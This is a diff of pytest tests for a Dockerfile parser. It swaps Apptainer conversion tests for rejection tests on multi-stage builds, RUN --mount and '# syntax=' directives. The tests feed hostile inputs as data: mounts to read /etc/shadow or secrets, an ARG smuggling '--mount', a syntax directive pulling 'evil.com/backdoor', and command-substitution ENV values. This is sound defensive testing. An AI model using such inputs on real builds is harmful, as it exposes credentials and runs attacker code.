@@ -1,14 +1,13 @@
-"""Tests for the Dockerfile parser and Apptainer .def converter."""
+"""Tests for the Dockerfile parser."""
 
 from __future__ import annotations
 
 import pytest
 
 from src.agent.dockerfile import (
+    DOCKER_IMAGES,
     DockerfileParsed,
     PREBUILT_ALIASES,
-    def_content_hash,
-    dockerfile_to_def,
     parse_dockerfile,
 )
 
@@ -141,17 +140,6 @@ ENTRYPOINT ["bash", "job.sh"]
         parsed = parse_dockerfile(dockerfile)
         assert parsed.from_image == "base"
 
-    def test_multistage_last_from(self):
-        dockerfile = """FROM golang:1.21 AS builder
-RUN go build -o app .
-FROM base
-ENTRYPOINT ["bash", "job.sh"]
-"""
-        parsed = parse_dockerfile(dockerfile)
-        assert parsed.from_image == "base"
-        # Multi-stage state reset — builder-stage RUN commands are cleared
-        assert parsed.run_commands == []
-
 
 # ---------------------------------------------------------------------------
 # ARG tests
@@ -191,14 +179,6 @@ class TestParseArg:
         """ARG with no default value — references are left unsubstituted."""
         parsed = parse_dockerfile('FROM base\nARG UNSET\nRUN echo $UNSET\nENTRYPOINT ["bash", "job.sh"]')
         assert parsed.run_commands == ["echo $UNSET"]
-
-    def test_arg_reset_on_from(self):
-        """ARG vars reset on each FROM (Docker scoping behavior)."""
-        parsed = parse_dockerfile(
-            'FROM golang:1.21 AS builder\nARG VER=old\nFROM base\nARG VER=new\nRUN echo $VER\nENTRYPOINT ["bash", "job.sh"]'
-        )
-        assert parsed.run_commands == ["echo new"]
-        assert parsed.arg_vars == {"VER": "new"}
 
     def test_arg_invalid_name(self):
         with pytest.raises(ValueError, match="Invalid ARG name"):
@@ -255,12 +235,10 @@ class TestParseCopy:
         assert parsed.needs_build
 
     def test_copy_reset_on_from(self):
-        """Copy instructions reset on each FROM."""
-        parsed = parse_dockerfile(
-            'FROM golang:1.21 AS builder\nCOPY go.mod /build/go.mod\nFROM base\nCOPY requirements.txt /app/requirements.txt\nENTRYPOINT ["bash", "job.sh"]'
-        )
+        """Copy instructions reset on each FROM — but multi-stage is now rejected."""
+        # Single FROM with COPY works
+        parsed = parse_dockerfile('FROM base\nCOPY requirements.txt /app/requirements.txt\nENTRYPOINT ["bash", "job.sh"]')
         assert len(parsed.copy_instructions) == 1
-        assert parsed.copy_instructions[0] == ("requirements.txt", "/app/requirements.txt")
 
 
 class TestCopyFromRejected:
@@ -393,28 +371,12 @@ class TestParseLabel:
         assert parsed.labels["version"] == "1.0"
         assert parsed.labels["author"] == "test"
 
-    def test_label_reset_on_from(self):
-        parsed = parse_dockerfile(
-            'FROM golang:1.21 AS builder\nLABEL stage=build\nFROM base\nLABEL stage=final\nENTRYPOINT ["bash", "job.sh"]'
-        )
-        assert parsed.labels == {"stage": "final"}
-
 
 class TestLabelNewlineStripped:
     def test_newline_in_label_stripped(self):
         """Label values with embedded newlines are sanitized."""
-        # Dockerfile line continuations are already joined, so actual \n in a label
-        # can only come from unusual input. The sanitizer handles it.
         parsed = parse_dockerfile('FROM base\nLABEL desc="safe value"\nENTRYPOINT ["bash", "job.sh"]')
         assert "\n" not in parsed.labels["desc"]
-
-
-class TestLabelInDef:
-    def test_labels_in_def_output(self):
-        parsed = parse_dockerfile('FROM base\nLABEL version=1.0\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "%labels" in def_content
-        assert "version 1.0" in def_content
 
 
 # ---------------------------------------------------------------------------
@@ -438,17 +400,6 @@ class TestParseShell:
     def test_shell_non_string_elements_rejected(self):
         with pytest.raises(ValueError, match="SHELL must be a JSON array of strings"):
             parse_dockerfile('FROM base\nSHELL [1, 2]\nENTRYPOINT ["bash", "job.sh"]')
-
-    def test_shell_affects_post_wrapping(self):
-        parsed = parse_dockerfile('FROM base\nSHELL ["/bin/bash", "-c"]\nRUN echo hello\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "/bin/bash -c" in def_content
-
-    def test_shell_reset_on_from(self):
-        parsed = parse_dockerfile(
-            'FROM golang:1.21 AS builder\nSHELL ["/bin/bash", "-c"]\nFROM base\nENTRYPOINT ["bash", "job.sh"]'
-        )
-        assert parsed.shell is None
 
 
 # ---------------------------------------------------------------------------
@@ -538,164 +489,101 @@ class TestNeedsBuild:
 
 
 # ---------------------------------------------------------------------------
-# .def conversion tests
+# Docker image mapping tests
 # ---------------------------------------------------------------------------
 
 
-class TestDefConversion:
-    def test_localimage_bootstrap(self):
-        parsed = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "Bootstrap: localimage" in def_content
-        assert "python312.sif" in def_content
+class TestDockerImages:
+    def test_all_aliases_have_docker_images(self):
+        for alias in ("base", "python312", "node20", "pytorch", "r-base"):
+            assert alias in DOCKER_IMAGES
+            assert ":" in DOCKER_IMAGES[alias]
 
-    def test_docker_bootstrap(self):
-        parsed = parse_dockerfile('FROM python:3.12-slim\nENTRYPOINT ["python", "main.py"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "Bootstrap: docker" in def_content
-        assert "From: python:3.12-slim" in def_content
-
-    def test_post_section(self):
-        parsed = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "%post" in def_content
-        assert "pip install pandas" in def_content
-
-    def test_environment_section(self):
-        parsed = parse_dockerfile('FROM base\nENV FOO=bar\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "%environment" in def_content
-        # shlex.quote doesn't add quotes for simple safe strings
-        assert "export FOO=bar" in def_content
-
-    def test_workdir_in_post_and_env(self):
-        parsed = parse_dockerfile('FROM base\nWORKDIR /app\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "mkdir -p /app" in def_content
-        assert "APPTAINER_CWD=/app" in def_content
-
-    def test_no_post_or_env_for_simple(self):
-        """A simple prebuilt-only Dockerfile (needs_build=False) still produces valid .def."""
-        parsed = DockerfileParsed(
-            from_image="base",
-            entrypoint_cmd=["bash", "job.sh"],
-            needs_build=False,
-        )
-        def_content = dockerfile_to_def(parsed)
-        assert "Bootstrap: localimage" in def_content
-        assert "%post" not in def_content
-        assert "%environment" not in def_content
-
-    def test_hash_deterministic(self):
-        parsed = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
-        def1 = dockerfile_to_def(parsed)
-        def2 = dockerfile_to_def(parsed)
-        assert def_content_hash(def1) == def_content_hash(def2)
-
-    def test_different_content_different_hash(self):
-        p1 = parse_dockerfile('FROM python312\nRUN pip install pandas\nENTRYPOINT ["python", "main.py"]')
-        p2 = parse_dockerfile('FROM python312\nRUN pip install numpy\nENTRYPOINT ["python", "main.py"]')
-        assert def_content_hash(dockerfile_to_def(p1)) != def_content_hash(dockerfile_to_def(p2))
-
-
-class TestDefNoFiles:
-    def test_no_files_section_in_def(self):
-        """The .def output should NOT have %files — proxy handles that."""
-        parsed = parse_dockerfile('FROM base\nCOPY file.txt /app/file.txt\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "%files" not in def_content
-
-    def test_copy_instructions_preserved_on_parsed(self):
-        """Copy instructions stay as structured data, not in the .def."""
-        parsed = parse_dockerfile('FROM base\nCOPY file.txt /app/file.txt\nENTRYPOINT ["bash", "job.sh"]')
-        assert len(parsed.copy_instructions) == 1
-        def_content = dockerfile_to_def(parsed)
-        assert "file.txt" not in def_content
-
-
-class TestDefWithLabels:
-    def test_labels_section_in_def(self):
-        parsed = parse_dockerfile('FROM base\nLABEL version=2.0 author="tester"\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "%labels" in def_content
-        assert "version 2.0" in def_content
-        assert "author tester" in def_content
-
-    def test_expose_label_in_def(self):
-        parsed = parse_dockerfile('FROM base\nEXPOSE 8080\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "%labels" in def_content
-        assert "ouro.exposed_ports 8080" in def_content
+    def test_prebuilt_aliases_are_docker_images(self):
+        assert PREBUILT_ALIASES is DOCKER_IMAGES
 
 
 # ---------------------------------------------------------------------------
-# Multi-stage reset tests
+# RUN --mount rejection tests
 # ---------------------------------------------------------------------------
 
 
-class TestMultiStageReset:
-    def test_builder_run_not_in_final_def(self):
-        """Builder-stage RUN commands should NOT appear in .def output."""
-        dockerfile = """FROM golang:1.21 AS builder
-RUN go build -o /app/main .
-RUN echo "builder only"
-FROM python312
-RUN pip install requests
-ENTRYPOINT ["python", "main.py"]
-"""
-        parsed = parse_dockerfile(dockerfile)
-        def_content = dockerfile_to_def(parsed)
-        assert "go build" not in def_content
-        assert "builder only" not in def_content
-        assert "pip install requests" in def_content
+class TestRunMountRejected:
+    def test_mount_bind_rejected(self):
+        with pytest.raises(ValueError, match="--mount"):
+            parse_dockerfile("FROM ubuntu:22.04\nRUN --mount=type=bind,source=/etc,target=/mnt cat /mnt/shadow\nCMD bash")
 
-    def test_builder_env_not_in_final_def(self):
-        """Builder-stage ENV vars should NOT appear in .def output."""
-        dockerfile = """FROM golang:1.21 AS builder
-ENV GOPATH=/go
-FROM python312
-ENV PYTHONPATH=/app
-ENTRYPOINT ["python", "main.py"]
-"""
-        parsed = parse_dockerfile(dockerfile)
-        def_content = dockerfile_to_def(parsed)
-        assert "GOPATH" not in def_content
-        assert "PYTHONPATH" in def_content
+    def test_mount_secret_rejected(self):
+        with pytest.raises(ValueError, match="--mount"):
+            parse_dockerfile("FROM ubuntu:22.04\nRUN --mount=type=secret,id=mysecret cat /run/secrets/mysecret\nCMD bash")
 
-    def test_builder_workdir_not_in_final(self):
-        """Builder-stage WORKDIR should NOT carry to final stage."""
-        dockerfile = """FROM golang:1.21 AS builder
-WORKDIR /build
-FROM python312
-WORKDIR /app
-ENTRYPOINT ["python", "main.py"]
-"""
-        parsed = parse_dockerfile(dockerfile)
-        assert parsed.workdir == "/app"
+    def test_mount_via_arg_substitution_rejected(self):
+        """ARG substitution must not bypass --mount check."""
+        with pytest.raises(ValueError, match="--mount"):
+            parse_dockerfile("FROM ubuntu:22.04\nARG X=--mount=type=bind,source=/etc,target=/mnt\nRUN $X cat /mnt/shadow\nCMD bash")
 
-    def test_last_from_wins(self):
-        """Only the last FROM's RUN/ENV/WORKDIR should be used."""
-        dockerfile = """FROM node:20 AS frontend
-RUN npm build
-ENV NODE_ENV=production
-WORKDIR /frontend
 
-FROM golang:1.21 AS backend
-RUN go build
-ENV GOPATH=/go
-WORKDIR /backend
+# ---------------------------------------------------------------------------
+# # syntax= directive rejection tests
+# ---------------------------------------------------------------------------
 
-FROM base
-RUN echo final
-ENV STAGE=final
-WORKDIR /app
-ENTRYPOINT ["bash", "job.sh"]
-"""
-        parsed = parse_dockerfile(dockerfile)
-        assert parsed.from_image == "base"
-        assert parsed.run_commands == ["echo final"]
-        assert parsed.env_vars == {"STAGE": "final"}
-        assert parsed.workdir == "/app"
+
+class TestSyntaxDirectiveRejected:
+    def test_syntax_directive_rejected(self):
+        with pytest.raises(ValueError, match="syntax"):
+            parse_dockerfile("# syntax=evil.com/backdoor:latest\nFROM ubuntu:22.04\nCMD bash")
+
+    def test_syntax_directive_no_space_rejected(self):
+        with pytest.raises(ValueError, match="syntax"):
+            parse_dockerfile("#syntax=evil.com/backdoor:latest\nFROM ubuntu:22.04\nCMD bash")
+
+
+# ---------------------------------------------------------------------------
+# Multi-stage build rejection tests
+# ---------------------------------------------------------------------------
+
+
+class TestMultiStageRejected:
+    def test_two_from_rejected(self):
+        with pytest.raises(ValueError, match="Multi-stage"):
+            parse_dockerfile("FROM python:3.12\nRUN pip install x\nFROM alpine:3.19\nCMD sh")
+
+    def test_single_from_allowed(self):
+        parsed = parse_dockerfile("FROM python:3.12\nCMD python")
+        assert parsed.from_image == "python:3.12"
+
+
+# ---------------------------------------------------------------------------
+# needs_docker_build tests
+# ---------------------------------------------------------------------------
+
+
+class TestNeedsDockerBuild:
+    def test_from_only_no_docker_build(self):
+        parsed = parse_dockerfile("FROM ruby:latest\nENTRYPOINT [\"ruby\", \"hello.rb\"]")
+        assert parsed.needs_build is True  # not a prebuilt alias
+        assert parsed.needs_docker_build is False  # no RUN/COPY/ENV
+
+    def test_from_with_run_needs_docker_build(self):
+        parsed = parse_dockerfile("FROM ruby:latest\nRUN gem install rails\nCMD ruby")
+        assert parsed.needs_docker_build is True
+
+    def test_from_with_env_needs_docker_build(self):
+        parsed = parse_dockerfile("FROM ruby:latest\nENV GEM_HOME=/usr/local\nCMD ruby")
+        assert parsed.needs_docker_build is True
+
+    def test_from_with_copy_needs_docker_build(self):
+        parsed = parse_dockerfile("FROM ruby:latest\nCOPY app.rb /app/app.rb\nCMD ruby")
+        assert parsed.needs_docker_build is True
+
+    def test_from_with_workdir_needs_docker_build(self):
+        parsed = parse_dockerfile("FROM ruby:latest\nWORKDIR /app\nCMD ruby")
+        assert parsed.needs_docker_build is True
+
+    def test_prebuilt_no_build(self):
+        parsed = parse_dockerfile('FROM base\nENTRYPOINT ["bash", "job.sh"]')
+        assert parsed.needs_build is False
+        assert parsed.needs_docker_build is False
 
 
 # ---------------------------------------------------------------------------
@@ -705,18 +593,6 @@ ENTRYPOINT ["bash", "job.sh"]
 
 class TestSecurityValidation:
     # -- ENV injection --
-    def test_env_value_injection_quoted(self):
-        """Shell expansion in ENV values should be safely quoted in .def."""
-        parsed = parse_dockerfile('FROM base\nENV FOO=$(whoami)\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        assert "export FOO='$(whoami)'" in def_content
-
-    def test_env_value_backtick_quoted(self):
-        parsed = parse_dockerfile('FROM base\nENV FOO=`id`\nENTRYPOINT ["bash", "job.sh"]')
-        def_content = dockerfile_to_def(parsed)
-        # shlex.quote wraps in single quotes
-        assert "'`id`'" in def_content
-
     def test_env_key_semicolon_rejected(self):
         """Space form: ENV KEY VALUE — semicolon in key is rejected."""
         with pytest.raises(ValueError, match="Invalid ENV key"):
@@ -801,15 +677,8 @@ ENTRYPOINT ["python", "main.py"]
         assert parsed.labels["version"] == "1.0"
         assert "8080" in parsed.labels["ouro.exposed_ports"]
         assert parsed.needs_build
+        assert parsed.needs_docker_build
         assert parsed.entrypoint_cmd == ["python", "main.py"]
-
-        # Verify .def output
-        def_content = dockerfile_to_def(parsed)
-        assert "Bootstrap: docker" in def_content
-        assert "%post" in def_content
-        assert "%environment" in def_content
-        assert "%labels" in def_content
-        assert "%files" not in def_content  # Proxy handles this
 
     def test_arg_substitution_with_copy(self):
         """ARG values are substituted into COPY args before validation."""
